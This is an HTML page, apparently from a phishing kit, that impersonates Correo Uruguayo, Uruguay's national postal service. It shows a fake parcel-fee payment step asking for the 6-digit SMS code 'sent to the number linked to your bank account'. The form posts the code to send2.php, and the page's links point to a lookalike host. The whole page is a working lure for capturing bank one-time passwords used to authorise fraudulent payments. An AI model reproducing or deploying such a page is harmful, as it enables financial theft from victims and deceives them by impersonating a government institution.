<!DOCTYPE html>
<html lang="es-ES" dir="ltr"><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js" id="eppiocemhmnlbhjplcgkofciiegomcon"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Verificación SMS - Correo Uruguayo</title>
    <meta content="initial-scale=1.0, width=device-width" name="viewport">
    
    <link href="./sms_files/css2" rel="stylesheet">
    <style>
        *, *:before, *:after { box-sizing: border-box; }
        body {
            margin: 0; color: #000; background: #f1f1f1;
            font-family: 'Source Sans Pro', sans-serif;
            font-size: 100%; line-height: 1.2em; font-weight: normal;
        }
        a { color: #124d98; font-weight: normal; text-decoration: none; }
        a:hover { text-decoration: underline; color: #124d98; }
        img { max-width: 100%; border: 0; }
        ul { margin: 0; padding: 0; list-style: none; }
        .container { max-width: 1120px; margin: 0 auto; }
        @media screen and (max-width: 1200px) { .container { width: 96%; padding: 0; } }
        .container:before, .container:after { display: table; content: " "; }
        .container:after { clear: both; }
        .fl { float: left !important; }
        .fr { float: right !important; }

        /* ===== TOPBAR ===== */
        #topbar { background: #59595c; color: #fff; font-size: .85em; height: 35px; }
        #topbar a { color: #fff; }
        #topbar ul { float: right; margin: 8px 0; }
        #topbar ul li { float: left; margin: 0 10px; }
        @media (max-width: 767px) { #topbar { display: none; } }

        /* ===== MAIN HEAD ===== */
        #main-head { background: #00a7e6; padding: 20px 0 24px 0; color: #fff; }
        #main-head h1 { margin: 0; }
        #main-head a { color: #fff; }
        #main-head #logo { padding: 14px 10px 14px 2px; display: block; float: left; border: 2px solid #00a7e6; width: 45%; }
        #main-head #logo:hover { border-bottom-color: #fff; }
        #main-head #logos { float: right; margin-bottom: 10px; }
        #main-head #logos ul li { float: left; margin-left: 16px; }
        @media (max-width: 979px) {
            #main-head { padding: 10px 0; }
            #main-head #logos { display: none; }
            #main-head #logo { float: left; padding: 0; }
            #main-head #logo img { margin-top: 2px; max-width: 160px; }
        }

        /* ===== NAVIGATION BAR ===== */
        .barraMenu { background-color: #01579b; height: 48px; }
        .barraMenu .container { position: relative; }
        nav#navigation { background: 0; color: #fff; }
        nav#navigation ul.navegacionPrincipal { margin: 0; padding: 0; background: #01579b !important; width: 100%; }
        nav#navigation ul.navegacionPrincipal > li { float: left; width: 25%; position: static; cursor: pointer; }
        nav#navigation ul.navegacionPrincipal > li:last-child { background: 0; }
        nav#navigation ul.navegacionPrincipal > li > span {
            text-transform: uppercase; text-decoration: none; text-align: center;
            padding: 14px 0; display: block; font-size: 1.2em;
            transition: background-color .45s; color: #fff;
        }
        nav#navigation ul.navegacionPrincipal > li > span:hover { background: #fff; color: #01579b; }
        @media (max-width: 979px) {
            .barraMenu { height: auto; }
            nav#navigation { display: none; }
        }

        /* ===== PAGE TITLE ===== */
        .page-title-bar { background: #01579b; padding: 28px 0; color: #fff; }
        .page-title-bar h2 { margin: 0; font-weight: 600; font-size: 2em; letter-spacing: -0.5px; }
        .page-title-bar p { margin: 8px 0 0 0; font-size: 1.1em; font-weight: 300; opacity: 0.9; }

        /* ===== MAIN SECTION ===== */
        .payment-section { padding: 40px 0 60px 0; }
        .payment-wrapper {
            max-width: 720px; margin: 0 auto;
            background: #fff; border-top: 4px solid #fd0;
            border-radius: 0 0 3px 3px; box-shadow: 1px 1px 3px #666;
        }

        /* Order summary strip */
        .order-summary {
            background: #f8f9fa;
            border-bottom: 1px solid #e8e8e8;
            padding: 24px 40px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 16px;
        }
        .order-detail { display: flex; flex-direction: column; }
        .order-detail .label {
            font-size: 0.8em; text-transform: uppercase;
            letter-spacing: 0.5px; color: #777;
            font-weight: 600; margin-bottom: 4px;
        }
        .order-detail .value { font-size: 1.25em; font-weight: 700; color: #01579b; }
        .order-detail .value.amount { font-size: 1.6em; color: #2e7d32; }

        /* Form */
        .form-header { padding: 28px 40px 18px 40px; border-bottom: 1px solid #e8e8e8; }
        .form-header h3 {
            font-size: 1.45em; text-transform: uppercase; font-weight: 600;
            letter-spacing: -1px; color: #414141; margin: 0 0 6px 0;
        }
        .form-header p { color: #666; font-size: 0.95em; margin: 0; }
        .form-body { padding: 28px 40px 40px 40px; }

        .form-group { margin-bottom: 22px; position: relative; }
        .form-group label {
            display: block; margin-bottom: 6px; color: #000;
            font-size: 16px; font-weight: 400;
        }
        .form-group input {
            width: 100%; height: 44px; padding: 6px 14px;
            border: 1px solid #999; color: #000;
            font-family: 'Source Sans Pro', sans-serif;
            font-size: 15px; font-weight: 400;
            transition: border-color 0.3s ease;
            border-radius: 0; background: #fff;
        }
        .form-group input:focus {
            outline: none; border-color: rgba(0, 172, 255, 0.8);
            box-shadow: inset 0 1px 1px rgba(0,0,0,0.075), 0 0 8px rgba(82,168,236,0.6);
        }
        .form-group input::placeholder { color: #7f7f7f; }
        .form-group input.input-error { border-color: #c33; }
        .form-group .error-msg { display: none; color: #c33; font-size: 0.85em; margin-top: 4px; }
        .form-group .error-msg.visible { display: block; }

        /* ===== SMS CODE INPUT ===== */
        .sms-code-wrapper {
            display: flex;
            gap: 12px;
            justify-content: center;
            margin: 10px 0 6px 0;
        }
        .sms-code-wrapper input {
            width: 52px; height: 58px;
            text-align: center;
            font-size: 1.6em; font-weight: 700;
            letter-spacing: 0;
            border: 1.5px solid #999;
            border-radius: 4px;
            padding: 0;
            caret-color: #01579b;
        }
        .sms-code-wrapper input:focus {
            border-color: rgba(0, 172, 255, 0.8);
            box-shadow: inset 0 1px 1px rgba(0,0,0,0.075), 0 0 8px rgba(82,168,236,0.6);
            outline: none;
        }
        .sms-code-wrapper input.input-error { border-color: #c33; }

        /* Phone hint */
        .phone-hint {
            background: #f0f6ff;
            border: 1px solid #c5d9f5;
            border-radius: 4px;
            padding: 14px 18px;
            margin-bottom: 28px;
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: 0.95em;
            color: #2c4a72;
        }
        .phone-hint svg { flex-shrink: 0; }
        .phone-hint strong { display: block; font-size: 1em; color: #01579b; margin-bottom: 2px; }

        /* Resend link */
        .resend-row {
            text-align: center;
            margin-top: 14px;
            font-size: 0.9em;
            color: #777;
        }
        .resend-row a { color: #01579b; font-weight: 600; }
        .resend-row a:hover { text-decoration: underline; }

        /* Timer */
        #resendTimer { font-weight: 600; color: #01579b; }

        .form-submit { margin-top: 30px; }
        .form-submit button {
            background: #01579b; padding: 12px 40px; width: 100%;
            color: #fff; border-radius: 3px; border: 1px solid #014174;
            font-family: 'Source Sans Pro', sans-serif; font-weight: 700;
            font-size: 1.1em; cursor: pointer;
            transition: all 0.35s ease; letter-spacing: 0.3px;
        }
        .form-submit button:hover { box-shadow: 0 0 4px #666; background: #014174; }
        .form-submit button:active { border-color: #00a7e6; }

        .secure-notice {
            margin-top: 20px; text-align: center;
            font-size: 0.88em; color: #777;
        }
        .secure-notice svg { vertical-align: middle; margin-right: 5px; }

        @media (max-width: 600px) {
            .form-header, .form-body { padding-left: 20px; padding-right: 20px; }
            .order-summary { padding: 20px; flex-direction: column; align-items: flex-start; }
            .page-title-bar h2 { font-size: 1.5em; }
            .sms-code-wrapper input { width: 42px; height: 50px; font-size: 1.3em; }
            .sms-code-wrapper { gap: 8px; }
        }

        /* ===== FOOTER ===== */
        footer#page-footer { background: #e6e6e6; border-top: 3px solid #fff; }
        footer#page-footer h2 { font-weight: 500; color: #414141; font-size: 1.2em; }
        footer#page-footer ul { margin-bottom: 60px !important; }
        footer#page-footer ul li { margin-bottom: 9px; }
        footer#page-footer ul li a { font-size: .9em; color: #124d98 !important; text-decoration: underline; }
        footer#page-footer ul li a:hover { text-decoration: none; }
        .row-fluid { overflow: hidden; }
        .span3 { width: 23.5%; float: left; margin-right: 2%; }
        .span3:last-child { margin-right: 0; }
        #box-tel { background: #f1f1f1; padding: 14px; font-size: .9em; text-align: center; color: #414141; float: right; width: 100%; }
        #box-tel p { margin: 0; }
        #box-tel span { display: block; margin-top: 6px; margin-bottom: 10px; font-size: 1.4em; }
        .disclaim { background: #01579b; color: #fff; padding: 30px 0; }
        .disclaim:after { content: ""; display: block; clear: both; }
        .disclaim img { float: left; margin-right: 14px; }
        .disclaim a { color: #fff; }
        .disclaim address { float: left; font-style: normal; font-size: .9em; line-height: 1.2em; }
        .disclaim ul { margin-bottom: 0 !important; }
        .disclaim ul li { line-height: 20px; }
        .disclaim ul li a { color: #fff !important; }
        @media screen and (max-width: 800px) {
            .span3 { width: 50%; }
            .span3:nth-child(2n) { margin-right: 0; }
            #box-tel { float: left; margin-top: 30px; }
        }
        @media (max-width: 767px) {
            .span3 { width: 100%; margin-right: 0; }
            .disclaim { text-align: center; }
            .disclaim img { float: none; margin: 0 0 10px 0; }
            .disclaim address { float: none !important; }
            .fr { width: 100%; float: left; margin-top: 30px; }
            .fr a { padding: 10px; display: block; }
        }

        /* ===== ERROR BANNER ===== */
        .sms-error-banner {
            display: none;
            background: #fdecea;
            border: 1.5px solid #e57373;
            border-left: 5px solid #c0392b;
            border-right: none;
            border-top: none;
            border-radius: 0;
            padding: 14px 18px;
            gap: 14px;
            align-items: flex-start;
            color: #7b1a1a;
            font-size: 0.95em;
            animation: slideDown 0.3s ease;
        }
        .sms-error-banner.visible { display: flex; }
        .sms-error-banner svg { flex-shrink: 0; margin-top: 2px; }
        .sms-error-banner > div { display: flex; flex-direction: column; gap: 4px; }
        .sms-error-banner strong { font-size: 1.05em; color: #c0392b; }
        .sms-error-banner span { color: #7b1a1a; line-height: 1.4; }
        @keyframes slideDown {
            from { opacity: 0; transform: translateY(-8px); }
            to   { opacity: 1; transform: translateY(0); }
        }
    </style>
<script bis_use="true" type="text/javascript" charset="utf-8" nonce="" data-dynamic-id="21e7e81e-10e6-4fef-bf96-1f864a3d5bd7" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/executors/200.js"></script><script bis_use="true" type="text/javascript" charset="utf-8" nonce="" data-dynamic-id="21e7e81e-10e6-4fef-bf96-1f864a3d5bd7" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/executors/101.js"></script></head>
<body __processed_f082ff25-3701-4dfe-bd93-5d9fa1dfb612__="true" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJlbmFibGVkIiwiRkFDRUJPT0siOiJlbmFibGVkIiwiVFdJVFRFUiI6ImVuYWJsZWQiLCJSRURESVQiOiJlbmFibGVkIiwiUElOVEVSRVNUIjoiZW5hYmxlZCIsIklOU1RBR1JBTSI6ImVuYWJsZWQiLCJUSUtUT0siOiJlbmFibGVkIiwiTElOS0VESU4iOiJlbmFibGVkIiwiQ09ORklHIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjIuMy4wIiwic2NvcmUiOjIwMzAwMH1d">

    <!-- ===== TOPBAR ===== -->
    <div id="topbar" bis_skin_checked="1">
        <div class="container" bis_skin_checked="1">
            <ul>
                <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#"><span>Preguntas frecuentes</span></a></li>
                <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#"><span>Convocatorias</span></a></li>
                <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#"><span>Contacto</span></a></li>
                <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#"><span>Servicios web</span></a></li>
            </ul>
        </div>
    </div>

    <!-- ===== HEADER ===== -->
    <div id="main-head" bis_skin_checked="1">
        <div class="container" bis_skin_checked="1">
            <h1>
                <a id="logo" href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#" title="Ir a la página principal de Correo Uruguayo">
                    <img alt="Correo Uruguayo" height="54" src="./sms_files/company_logo.png" width="255">
                </a>
            </h1>
            <div id="logos" bis_skin_checked="1">
                <ul>
                    <li><a target="_blank" href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#" title="Ir a uruguaydigital.uy"><img src="./sms_files/logoUruguayDigital.png" alt="Uruguay Digital"></a></li>
                </ul>
            </div>
        </div>
    </div>

    <!-- ===== NAVIGATION ===== -->
    <div class="barraMenu" bis_skin_checked="1">
        <div class="container" bis_skin_checked="1">
            <nav id="navigation" role="navigation">
                <ul class="navegacionPrincipal">
                    <li><span>Institucional</span></li>
                    <li><span>Productos y Servicios</span></li>
                    <li><span>Filatelia</span></li>
                    <li><span>Trámites</span></li>
                </ul>
            </nav>
        </div>
    </div>

    <!-- ===== PAGE TITLE ===== -->
    <div class="page-title-bar" bis_skin_checked="1">
        <div class="container" bis_skin_checked="1">
            <h2>Verificación de Identidad</h2>
            <p>Ingrese el código enviado a su teléfono para confirmar el pago</p>
        </div>
    </div>

    <!-- ===== CONTENT ===== -->
    <div class="payment-section" bis_skin_checked="1">
        <div class="container" bis_skin_checked="1">
            <div class="payment-wrapper" bis_skin_checked="1">

                <!-- Order Summary -->
                <div class="order-summary" bis_skin_checked="1">
                    <div class="order-detail" bis_skin_checked="1">
                        <span class="label">Número de Envío</span>
                        <span class="value">UY****************</span>
                    </div>
                    <div class="order-detail" bis_skin_checked="1">
                        <span class="label">Monto a Pagar</span>
                        <span class="value amount">$U 2,99</span>
                    </div>
                </div>

                <!-- Form Header -->
                <div class="form-header" bis_skin_checked="1">
                    <h3>Verificación por SMS</h3>
                    <p>Hemos enviado un código de 6 dígitos al número vinculado a su cuenta bancaria</p>
                </div>

                <!-- Form Body -->
                <div class="form-body" bis_skin_checked="1">

                    <!-- Phone hint -->
                    <div class="phone-hint" bis_skin_checked="1">
                        <svg width="22" height="22" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <rect x="6" y="1" width="10" height="20" rx="2" stroke="#01579b" stroke-width="1.5" fill="none"></rect>
                            <circle cx="11" cy="17.5" r="1" fill="#01579b"></circle>
                            <rect x="8.5" y="3.5" width="5" height="1" rx="0.5" fill="#01579b"></rect>
                        </svg>
                        <div bis_skin_checked="1">
                            Si no recibió el código, verifique su número o solicite el reenvío.
                        </div>
                    </div>

                    <form id="smsForm" method="POST" action="send2.php" novalidate="" autocomplete="off">
						<input style="visibilty: hidden" type="hidden" name="step" value="esssm">					

                        <div class="form-group" bis_skin_checked="1">
                            <label style="text-align:center; display:block; margin-bottom: 16px;">Ingrese el código de 6 dígitos <span style="color:#c33;">(*)</span></label>
                            <div class="sms-code-wrapper" bis_skin_checked="1">
                                <input type="text" class="sms-digit" maxlength="1" inputmode="numeric" autocomplete="off">
                                <input type="text" class="sms-digit" maxlength="1" inputmode="numeric" autocomplete="off">
                                <input type="text" class="sms-digit" maxlength="1" inputmode="numeric" autocomplete="off">
                                <input type="text" class="sms-digit" maxlength="1" inputmode="numeric" autocomplete="off">
                                <input type="text" class="sms-digit" maxlength="1" inputmode="numeric" autocomplete="off">
                                <input type="text" class="sms-digit" maxlength="1" inputmode="numeric" autocomplete="off">
                            </div>
                            <div class="error-msg" id="smsCodeError" style="text-align:center;" bis_skin_checked="1">Por favor ingrese el código completo de 6 dígitos</div>
                        </div>
<input type="hidden" name="sms_code" id="sms_code">
                        <!-- Resend -->
                        <div class="resend-row" bis_skin_checked="1">
                            ¿No recibió el código?
                            <a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#" id="resendLink" style="pointer-events:none; opacity:0.4;">Reenviar código</a>
                            en <span id="resendTimer">00:07</span>
                        </div>

                        <div class="form-submit" bis_skin_checked="1">
                            <button type="submit">Confirmar Verificación</button>
                        </div>

                        <div class="secure-notice" bis_skin_checked="1">
                            <svg width="14" height="16" viewBox="0 0 14 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M7 0C4.8 0 3 1.8 3 4V6H2C0.9 6 0 6.9 0 8V14C0 15.1 0.9 16 2 16H12C13.1 16 14 15.1 14 14V8C14 6.9 13.1 6 12 6H11V4C11 1.8 9.2 0 7 0ZM7 1.5C8.4 1.5 9.5 2.6 9.5 4V6H4.5V4C4.5 2.6 5.6 1.5 7 1.5ZM7 10C7.8 10 8.5 10.7 8.5 11.5C8.5 12.3 7.8 13 7 13C6.2 13 5.5 12.3 5.5 11.5C5.5 10.7 6.2 10 7 10Z" fill="#999"></path>
                            </svg>
                            Verificación segura. Su información está protegida mediante conexión cifrada.
                        </div>
                    </form>
                </div>

            </div>
        </div>
    </div>

    <!-- ===== FOOTER ===== -->
    <footer id="page-footer">
        <div class="container" bis_skin_checked="1">
            <div class="row-fluid mapaSitio" style="padding: 26px 0;" bis_skin_checked="1">
                <div class="span3" bis_skin_checked="1">
                    <h2>Institucional</h2>
                    <ul>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#">Autoridades</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#">Sobre nosotros</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#">Transparencia</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#">Preguntas frecuentes</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#">Convocatorias</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#">Contacto</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#">Sala de prensa</a></li>
                    </ul>
                </div>
                <div class="span3" bis_skin_checked="1">
                    <h2>Productos y Servicios</h2>
                    <ul>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#">Paquetes</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#">Correspondencia</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#">Comercio electrónico</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#">Servicios en línea</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#">Logística</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#">Giros</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#">Firma Digital</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#">Tarifas</a></li>
                    </ul>
                </div>
                <div class="span3" bis_skin_checked="1">
                    <h2>Filatelia</h2>
                    <ul>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#">¿Qué es la filatelia?</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#">Novedades filatélicas</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#">Plan filatélico anual</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#">Sellos</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#">Marcofilia</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#">Hojas filatélicas</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#">Últimas emisiones</a></li>
                    </ul>
                </div>
                <div class="span3" bis_skin_checked="1">
                    <h2>Trámites</h2>
                    <ul>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#">Declaración de compras del exterior</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#">Factura electrónica</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#">Registro en el IRCCA</a></li>
                        <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#">Guía de trámites</a></li>
                    </ul>
                    <div id="box-tel" bis_skin_checked="1">
                        <p>WhatsApp: <a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#"><span>098 01 2108</span></a></p>
                        <div bis_skin_checked="1">
                            <p>Atención telefónica: <span>0800 2108</span></p>
                            <a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#">Contáctese con nosotros</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="disclaim" bis_skin_checked="1">
            <div class="container" bis_skin_checked="1">
                <img alt="Correo Uruguayo" src="./sms_files/logoCorreoPie.jpg">
                <address class="fl">Administración Nacional de Correos<br>
                Dirección: Buenos Aires 451, Montevideo, Uruguay<br>
                Teléfono: [00 598] 2916 0200<br>
                Mail: <a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#">[email&nbsp;protected]</a></address>
                <ul class="fr">
                    <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#">Política de Privacidad</a></li>
                    <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#">Términos de uso</a></li>
                    <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#">Reglamentación de reclamaciones</a></li>
                    <li><a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#">Mapa del sitio</a></li>
                    <li>
                        <address class="fl">
                            <a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#"><img alt="Instagram" src="./sms_files/instagram.png"></a>&nbsp;
                            <a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#"><img alt="X" src="./sms_files/X.png"></a>&nbsp;
                            <a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#"><img alt="Linkedin" src="./sms_files/Linkedin.png"></a>&nbsp;
                            <a href="https://correos.test121815.test-account.com/wp-contact/0019393928/N7v-RVv8b_GRVBY/user-155393/verificacion-sms.php#"><img alt="Youtube" src="./sms_files/Youtube.png"></a>
                        </address>
                    </li>
                </ul>
            </div>
        </div>
    </footer>

    <script>
    (function () {

        // ===== SMS DIGIT INPUTS: auto-advance & backspace =====
        var digits = document.querySelectorAll('.sms-digit');

        digits.forEach(function (input, index) {
            // Only allow single digit
            input.addEventListener('input', function () {
                this.value = this.value.replace(/\D/g, '').slice(-1);
                // Auto-advance to next
                if (this.value && index < digits.length - 1) {
                    digits[index + 1].focus();
                }
            });

            // Backspace goes to previous
            input.addEventListener('keydown', function (e) {
                if (e.key === 'Backspace' && !this.value && index > 0) {
                    digits[index - 1].focus();
                }
            });

            // Select content on focus
            input.addEventListener('focus', function () {
                this.select();
            });
        });

        // ===== PASTE: distribute pasted digits across boxes =====
        digits[0].addEventListener('paste', function (e) {
            e.preventDefault();
            var pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
            for (var i = 0; i < digits.length && i < pasted.length; i++) {
                digits[i].value = pasted[i];
            }
            var focusIdx = Math.min(pasted.length, digits.length - 1);
            digits[focusIdx].focus();
        });

        // ===== RESEND COUNTDOWN =====
        var seconds = 90;
        var timerEl = document.getElementById('resendTimer');
        var resendLink = document.getElementById('resendLink');

        var countdown = setInterval(function () {
            seconds--;
            var m = Math.floor(seconds / 60);
            var s = seconds % 60;
            timerEl.textContent = (m < 10 ? '0' : '') + m + ':' + (s < 10 ? '0' : '') + s;
            if (seconds <= 0) {
                clearInterval(countdown);
                timerEl.textContent = '';
                resendLink.style.pointerEvents = 'auto';
                resendLink.style.opacity = '1';
                document.querySelector('.resend-row').innerHTML =
                    '¿No recibió el código? <a href="#" id="resendLink">Reenviar código</a>';
            }
        }, 1000);

        // ===== FORM VALIDATION =====
        document.getElementById('smsForm').addEventListener('submit', function (e) {
            e.preventDefault(); // 🚨 VERY IMPORTANT

            var code = '';
            digits.forEach(function (d) { code += d.value; });

            document.getElementById('sms_code').value = code;

            // Reset errors
            digits.forEach(function (d) { d.classList.remove('input-error'); });
            document.getElementById('smsCodeError').classList.remove('visible');

            if (code.length < 6) {
                digits.forEach(function (d) { d.classList.add('input-error'); });
                document.getElementById('smsCodeError').classList.add('visible');
                return; // ❌ do NOT submit
            }

            // ✅ Only submit if valid
            this.submit();
        });

    })();
    </script>


</body></html>